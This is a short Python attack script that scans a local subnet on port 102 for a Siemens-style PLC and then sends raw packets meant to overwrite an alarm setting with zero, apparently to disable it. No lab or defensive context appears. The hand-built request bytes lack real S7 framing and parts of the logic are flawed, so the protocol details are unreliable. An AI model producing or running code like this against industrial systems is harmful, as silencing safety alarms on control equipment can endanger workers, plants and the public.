import socket
import struct
import sys
import scapy.all as scapy

# Define the PLC's IP address range
ip_range = '192.168.1.0/24'

# Define the PLC's port number
port = 102

def find_plc_ip(ip_range):
    # Split the IP range into a list of IP addresses
    ip_addresses = ip_range.split('.')
    ip_addresses = [ip_addresses[0] + '.' + ip_addresses[1] + '.' + ip_addresses[2] + '.' + str(i) for i in range(1, 255)]

    # Scan each IP address to find the PLC
    for ip in ip_addresses:
        try:
            # Create a socket object
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Connect to the IP address and port
            sock.connect((ip, port))

            # Send a request to the PLC to get its IP address
            request = b'\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01'
            sock.send(request)

            # Receive the response from the PLC
            response = sock.recv(1024)

            # Check if the response is valid
            if response[0] == 0x00 and response[1] == 0x00:
                return ip

            # Close the socket
            sock.close()
        except socket.error:
            pass

    # Return None if no PLC is found
    return None

def modify_alarm_settings(ip, alarm_address, new_setting):
    # Create a socket object
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the PLC's IP address and port
    sock.connect((ip, port))

    # Send a request to the PLC to modify the alarm settings
    request = b'\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x06'
    request += struct.pack('!H', alarm_address)
    request += struct.pack('!B', new_setting)
    sock.send(request)

    # Close the socket
    sock.close()

def send_s7_communication_packet(ip, command):
    # Create a packet with the S7 communication protocol
    packet = scapy.IP(dst=ip)/scapy.TCP(dport=102)/scapy.Raw(load=command)

    # Send the packet
    scapy.send(packet, verbose=0)

def main():
    # Find the PLC's IP address
    plc_ip = find_plc_ip(ip_range)

    # Check if the PLC's IP address is found
    if plc_ip:
        print(f'PLC IP address: {plc_ip}')

        # Modify the alarm settings
        alarm_address = 0x1000  # Replace with the actual alarm address
        new_setting = 0  # Replace with the new alarm setting
        modify_alarm_settings(plc_ip, alarm_address, new_setting)

        # Create a packet with the S7 communication protocol to modify the alarm settings
        command = b'\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x06'
        command += struct.pack('!H', alarm_address)
        command += struct.pack('!B', new_setting)
        send_s7_communication_packet(plc_ip, command)
    else:
        print('PLC not found')

if __name__ == '__main__':
    main()